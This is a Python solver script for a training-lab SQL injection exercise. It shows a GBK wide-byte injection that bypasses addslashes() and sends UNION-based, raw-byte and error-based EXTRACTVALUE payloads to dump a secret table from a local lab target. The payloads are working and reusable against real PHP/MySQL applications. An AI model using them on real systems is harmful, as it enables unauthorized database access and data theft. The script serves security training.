#!/usr/bin/env python3
"""
Lab 20 -- WAF Bypass: GBK Wide-Byte Injection
=============================================
Bypasses addslashes() by exploiting GBK multi-byte character encoding.

The trick: send 0xBF before a single quote (0x27).
  - addslashes() inserts backslash (0x5C): 0xBF 0x5C 0x27
  - MySQL in GBK mode reads 0xBF5C as a valid GBK character
  - The quote 0x27 is now UNESCAPED and breaks out of the string

Usage:
    python3 lab20_gbk_widebyte.py [BASE_URL]

Default target: http://localhost/SQLi-Arena
"""
import requests
import sys
import re

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
TARGET = f"{BASE}/mysql/lab20"


def method1_url_encode():
    """Send the wide-byte payload via POST with URL-encoded body."""
    print("[*] Method 1: URL-encoded wide-byte payload")

    # %bf%27 = 0xBF + single quote
    # After addslashes: 0xBF 0x5C 0x27 → GBK char + unescaped quote
    body = "username=%bf%27+UNION+SELECT+secret,2+FROM+secret_data+--+-"

    print(f"[*] POST body: {body}")
    print(f"[*] Bytes: 0xBF 0x27 → addslashes → 0xBF 0x5C 0x27 → GBK: [縗] + '")
    print()

    r = requests.post(TARGET, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if match:
        return match.group(0)
    return None


def method2_raw_bytes():
    """Send the wide-byte payload using raw bytes in the parameter."""
    print("[*] Method 2: Raw bytes via latin-1 encoding")

    # Construct the payload with raw 0xBF byte
    raw_payload = b"\xbf' UNION SELECT secret,2 FROM secret_data -- -"
    # Decode as latin-1 to preserve raw bytes (requests will URL-encode them)
    payload_str = raw_payload.decode("latin-1")

    print(f"[*] Raw bytes: {raw_payload}")
    print()

    r = requests.post(TARGET, data={"username": payload_str})
    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if match:
        return match.group(0)
    return None


def method3_error_based():
    """Alternative: use error-based extraction with wide byte."""
    print("[*] Method 3: Error-based EXTRACTVALUE with wide byte")

    body = (
        "username=%bf%27+AND+EXTRACTVALUE(1,+CONCAT(0x7e,+"
        "(SELECT+secret+FROM+secret_data+LIMIT+1)"
        "))+AND+%bf%27=%bf%27"
    )

    r = requests.post(TARGET, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    import html as html_mod
    text = html_mod.unescape(r.text)
    match = re.search(r"XPATH syntax error: '~([^']+)'", text)
    if match:
        return match.group(1)
    return None


# ── Main ──
print(f"[*] Target: {TARGET}")
print("[*] Attack: GBK wide-byte to bypass addslashes()")
print()
print("[*] How it works:")
print("    Input:       0xBF 0x27           (0xBF + single quote)")
print("    addslashes:  0xBF 0x5C 0x27      (backslash added before quote)")
print("    GBK decode:  [0xBF5C] 0x27       (0xBF5C = valid GBK character)")
print("    Result:      <GBK_char> '         (quote is now UNESCAPED!)")
print()

# Try each method
flag = method1_url_encode()
if flag:
    print(f"\n[+] Flag: {flag}")
    sys.exit(0)

print("\n[-] Method 1 failed, trying method 2...\n")
flag = method2_raw_bytes()
if flag:
    print(f"\n[+] Flag: {flag}")
    sys.exit(0)

print("\n[-] Method 2 failed, trying method 3 (error-based)...\n")
flag = method3_error_based()
if flag:
    print(f"\n[+] Flag: {flag}")
    sys.exit(0)

print("\n[-] All methods failed. Check lab setup.")
sys.exit(1)
